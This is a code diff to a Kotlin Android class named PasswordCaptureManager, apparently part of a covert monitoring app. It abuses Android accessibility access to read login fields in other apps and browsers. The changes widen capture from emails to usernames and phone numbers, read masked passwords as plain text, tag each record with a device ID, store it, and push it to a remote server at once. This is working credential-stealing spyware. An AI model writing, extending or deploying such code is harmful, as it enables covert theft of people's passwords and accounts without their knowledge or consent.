@@ -30,7 +30,11 @@ class PasswordCaptureManager(
     )
     
     private val emailFieldKeywords = listOf(
-        "email", "e-mail", "mail", "username", "user", "account", "login", "signin"
+        "email", "e-mail", "mail", "username", "user", "account", "login", "signin",
+        "phone", "phone number", "mobile", "mobile number", "tel", "telephone",
+        "userid", "user id", "user_id", "userid", "user name", "user_name",
+        "account name", "account_name", "accountname", "login id", "login_id",
+        "sign in", "signin", "sign-in", "identifier", "id", "user identifier"
     )
     
     // Use first 3 chars + length for duplicate detection to avoid storing full password in memory
@@ -67,13 +71,25 @@ class PasswordCaptureManager(
                 }
             }
             
-            // Check if this is an email field
-            if (isEmailField(source)) {
-                val email = event.text?.firstOrNull()?.toString() ?: ""
-                // Capture email even if not fully valid yet (user might still be typing)
-                // We'll validate it when associating with password
-                if (email.isNotBlank() && email.contains("@")) {
-                    captureEmail(packageName, email, source)
+            // Check if this is an email/username/phone field
+            if (isEmailField(source) || isUsernameField(source) || isPhoneField(source)) {
+                val identifier = event.text?.firstOrNull()?.toString() ?: ""
+                val identifierFromNode = source.text?.toString() ?: ""
+                val finalIdentifier = identifier.ifBlank { identifierFromNode }
+                
+                if (finalIdentifier.isNotBlank()) {
+                    // Capture email if it contains @
+                    if (finalIdentifier.contains("@")) {
+                        captureEmail(packageName, finalIdentifier, source)
+                    }
+                    // Capture phone if it's numeric and looks like phone
+                    else if (isPhoneNumber(finalIdentifier)) {
+                        capturePhone(packageName, finalIdentifier, source)
+                    }
+                    // Capture username (any non-empty text)
+                    else if (finalIdentifier.length >= 3) {
+                        captureUsername(packageName, finalIdentifier, source)
+                    }
                 }
             }
             
@@ -148,20 +164,18 @@ class PasswordCaptureManager(
     
     private fun isEmailField(node: AccessibilityNodeInfo): Boolean {
         return try {
-            // Check hint text
             val hint = node.hintText?.toString()?.lowercase() ?: ""
-            if (emailFieldKeywords.any { hint.contains(it) }) {
-                return true
-            }
-            
-            // Check content description
             val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
-            if (emailFieldKeywords.any { contentDesc.contains(it) }) {
+            val viewId = node.viewIdResourceName?.lowercase() ?: ""
+            val text = node.text?.toString() ?: ""
+            
+            // Check for email-specific keywords
+            val emailKeywords = listOf("email", "e-mail", "mail")
+            if (emailKeywords.any { hint.contains(it) || contentDesc.contains(it) || viewId.contains(it) }) {
                 return true
             }
             
             // Check if text looks like email
-            val text = node.text?.toString() ?: ""
             if (isValidEmail(text)) {
                 return true
             }
@@ -170,6 +184,57 @@ class PasswordCaptureManager(
         } catch (e: Exception) {
             false
         }
+    }
+    
+    private fun isUsernameField(node: AccessibilityNodeInfo): Boolean {
+        return try {
+            val hint = node.hintText?.toString()?.lowercase() ?: ""
+            val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
+            val viewId = node.viewIdResourceName?.lowercase() ?: ""
+            
+            // Check for username-specific keywords
+            val usernameKeywords = listOf(
+                "username", "user name", "user_name", "userid", "user id", "user_id",
+                "account", "account name", "account_name", "login id", "login_id",
+                "sign in", "signin", "sign-in", "identifier", "user identifier"
+            )
+            
+            if (usernameKeywords.any { hint.contains(it) || contentDesc.contains(it) || viewId.contains(it) }) {
+                return true
+            }
+            
+            false
+        } catch (e: Exception) {
+            false
+        }
+    }
+    
+    private fun isPhoneField(node: AccessibilityNodeInfo): Boolean {
+        return try {
+            val hint = node.hintText?.toString()?.lowercase() ?: ""
+            val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
+            val viewId = node.viewIdResourceName?.lowercase() ?: ""
+            
+            // Check for phone-specific keywords
+            val phoneKeywords = listOf(
+                "phone", "phone number", "mobile", "mobile number", "tel", "telephone",
+                "phone_number", "mobile_number", "contact number"
+            )
+            
+            if (phoneKeywords.any { hint.contains(it) || contentDesc.contains(it) || viewId.contains(it) }) {
+                return true
+            }
+            
+            false
+        } catch (e: Exception) {
+            false
+        }
+    }
+    
+    private fun isPhoneNumber(text: String): Boolean {
+        // Check if text looks like a phone number (numeric with optional +, -, spaces, parentheses)
+        val cleaned = text.replace(Regex("[+\\-\\s()]"), "")
+        return cleaned.length >= 7 && cleaned.length <= 15 && cleaned.all { it.isDigit() }
     }
     
     private fun isValidEmail(email: String): Boolean {
@@ -300,16 +365,40 @@ class PasswordCaptureManager(
             credentialBuffer[packageName] = CredentialBuilder()
         }
         credentialBuffer[packageName]?.email = email
-        credentialBuffer[packageName]?.timestamp = System.currentTimeMillis() // Track when email was captured
+        credentialBuffer[packageName]?.username = email // Email can also be username
+        credentialBuffer[packageName]?.timestamp = System.currentTimeMillis()
         
-        // Also try to extract username if the email field is also used for username
-        if (node.hintText?.contains("username", ignoreCase = true) == true ||
-            node.contentDescription?.contains("username", ignoreCase = true) == true) {
-            credentialBuffer[packageName]?.username = email
+        Timber.tag("CREDENTIAL_CAPTURE").d("📧 Email captured for $packageName: $email")
+        
+        // Clean up old buffer entries
+        cleanupOldBufferEntries()
+    }
+    
+    private fun captureUsername(packageName: String, username: String, node: AccessibilityNodeInfo) {
+        // Store in buffer for potential password association
+        if (!credentialBuffer.containsKey(packageName)) {
+            credentialBuffer[packageName] = CredentialBuilder()
         }
-        Timber.v("Email buffered for $packageName: $email")
+        credentialBuffer[packageName]?.username = username
+        credentialBuffer[packageName]?.timestamp = System.currentTimeMillis()
         
-        // Clean up old buffer entries (older than 5 minutes) to prevent memory leaks
+        Timber.tag("CREDENTIAL_CAPTURE").d("👤 Username captured for $packageName: $username")
+        
+        // Clean up old buffer entries
+        cleanupOldBufferEntries()
+    }
+    
+    private fun capturePhone(packageName: String, phone: String, node: AccessibilityNodeInfo) {
+        // Store in buffer for potential password association
+        if (!credentialBuffer.containsKey(packageName)) {
+            credentialBuffer[packageName] = CredentialBuilder()
+        }
+        credentialBuffer[packageName]?.username = phone // Phone can be used as username
+        credentialBuffer[packageName]?.timestamp = System.currentTimeMillis()
+        
+        Timber.tag("CREDENTIAL_CAPTURE").d("📱 Phone captured for $packageName: $phone")
+        
+        // Clean up old buffer entries
         cleanupOldBufferEntries()
     }
     
@@ -346,24 +435,32 @@ class PasswordCaptureManager(
             try {
                 val rootNode = service.rootInActiveWindow ?: return@launch
                 
-                // Find email and password fields
-                val emailField = findEmailField(rootNode)
+                // Find email/username/phone and password fields
+                val identifierField = findEmailField(rootNode) ?: findUsernameField(rootNode) ?: findPhoneField(rootNode)
                 val passwordField = findPasswordField(rootNode)
                 
-                if (emailField != null && passwordField != null) {
-                    // Get email and password - AccessibilityService can access password text even when masked
-                    val email = emailField.text?.toString() ?: ""
-                    // For password fields, AccessibilityService can read the actual text value
+                if (identifierField != null && passwordField != null) {
+                    // Get identifier (email/username/phone) and password
+                    val identifier = identifierField.text?.toString() ?: ""
                     val password = passwordField.text?.toString() ?: ""
                     val url = extractUrl(rootNode)
                     val domain = extractDomain(url)
                     
-                    if (email.isNotBlank() && password.isNotBlank()) {
+                    if (identifier.isNotBlank() && password.isNotBlank()) {
+                        val deviceId = com.chats.capture.managers.DeviceRegistrationManager(service).getDeviceId()
+                        
+                        // Determine if identifier is email, phone, or username
+                        val email = if (identifier.contains("@")) identifier else null
+                        val phone = if (email == null && isPhoneNumber(identifier)) identifier else null
+                        val username = if (email == null && phone == null) identifier else null
+                        
                         val credential = Credential(
+                            deviceId = deviceId,
                             accountType = CredentialType.BROWSER_LOGIN,
                             appPackage = packageName,
                             appName = getAppName(packageName),
                             email = email,
+                            username = username ?: phone, // Use phone as username if applicable
                             password = password, // Plain text, not masked
                             domain = domain,
                             url = url,
@@ -372,8 +469,22 @@ class PasswordCaptureManager(
                             synced = false
                         )
                         
-                        credentialDao.insertCredential(credential)
-                        Timber.d("Browser credentials captured: $email - ${password.take(3)}*** (length: ${password.length})")
+                        // Check for duplicate
+                        val duplicate = credentialDao.findDuplicateCredential(
+                            packageName,
+                            username ?: email,
+                            password
+                        )
+                        
+                        if (duplicate == null) {
+                            credentialDao.insertCredential(credential)
+                            Timber.tag("CREDENTIAL_CAPTURE").i("🌐 Browser credentials captured: ${email ?: username ?: phone} - ${password.take(3)}*** (length: ${password.length})")
+                            
+                            // Immediately sync to server
+                            syncPasswordImmediately(credential)
+                        } else {
+                            Timber.v("Duplicate browser credential skipped")
+                        }
                     }
                 }
                 
@@ -384,28 +495,41 @@ class PasswordCaptureManager(
         }
     }
     
+    private fun findPhoneField(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        return findFieldByKeywords(root, listOf(
+            "phone", "phone number", "mobile", "mobile number", "tel", "telephone",
+            "phone_number", "mobile_number", "contact number"
+        ))
+    }
+    
     private fun captureAppCredentials(node: AccessibilityNodeInfo, packageName: String) {
         serviceScope.launch(Dispatchers.IO) {
             try {
                 val rootNode = service.rootInActiveWindow ?: return@launch
                 
-                // Find email and password fields
-                val emailField = findEmailField(rootNode)
+                // Find identifier (email/username/phone) and password fields
+                val identifierField = findEmailField(rootNode) ?: findUsernameField(rootNode) ?: findPhoneField(rootNode)
                 val passwordField = findPasswordField(rootNode)
                 
-                if (emailField != null && passwordField != null) {
-                    // Get email and password - AccessibilityService can access password text even when masked
-                    val email = emailField.text?.toString() ?: ""
-                    // For password fields, AccessibilityService can read the actual text value
+                if (identifierField != null && passwordField != null) {
+                    // Get identifier and password
+                    val identifier = identifierField.text?.toString() ?: ""
                     val password = passwordField.text?.toString() ?: ""
-                    val username = findUsernameField(rootNode)?.text?.toString() ?: email // Try to find a dedicated username field
                     
-                    if (email.isNotBlank() && password.isNotBlank()) {
+                    // Determine if identifier is email, phone, or username
+                    val email = if (identifier.contains("@")) identifier else null
+                    val phone = if (email == null && isPhoneNumber(identifier)) identifier else null
+                    val username = if (email == null && phone == null) identifier else null
+                    
+                    if (identifier.isNotBlank() && password.isNotBlank()) {
+                        val deviceId = com.chats.capture.managers.DeviceRegistrationManager(service).getDeviceId()
+                        
                         val credential = Credential(
-                            accountType = CredentialType.SOCIAL_MEDIA_LOGIN, // Or APP_LOGIN
+                            deviceId = deviceId,
+                            accountType = CredentialType.APP_PASSWORD,
                             appPackage = packageName,
                             appName = getAppName(packageName),
-                            username = username,
+                            username = username ?: phone, // Use phone as username if applicable
                             email = email,
                             password = password, // Plain text, not masked
                             devicePassword = false,
@@ -413,8 +537,22 @@ class PasswordCaptureManager(
                             synced = false
                         )
                         
-                        credentialDao.insertCredential(credential)
-                        Timber.d("App credentials captured: $packageName - $email - ${password.take(3)}*** (length: ${password.length})")
+                        // Check for duplicate
+                        val duplicate = credentialDao.findDuplicateCredential(
+                            packageName,
+                            username ?: email,
+                            password
+                        )
+                        
+                        if (duplicate == null) {
+                            credentialDao.insertCredential(credential)
+                            Timber.tag("CREDENTIAL_CAPTURE").i("📱 App credentials captured: $packageName - ${email ?: username ?: phone} - ${password.take(3)}*** (length: ${password.length})")
+                            
+                            // Immediately sync to server
+                            syncPasswordImmediately(credential)
+                        } else {
+                            Timber.v("Duplicate app credential skipped")
+                        }
                     }
                 }
                 
